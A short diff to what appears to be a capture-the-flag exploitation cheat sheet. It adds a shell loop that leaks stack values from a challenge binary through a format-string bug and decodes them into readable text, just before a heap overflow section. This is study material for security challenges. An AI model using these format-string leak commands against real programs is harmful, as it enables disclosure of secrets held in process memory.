@@ -23,5 +23,11 @@ Leaking address:
 ```sh
 for i in $(seq 1 20); do ./ch5 %$i\$x;printf "\n";done
 ```
+
+Show the content : 
+```sh
+for i in $(seq 1 20); do ./ch5 %$i\$x |rax2 -s |tr -cd "[:print:]" |rev;printf "\n";done
+```
+
 ##  Heap Overflow
 
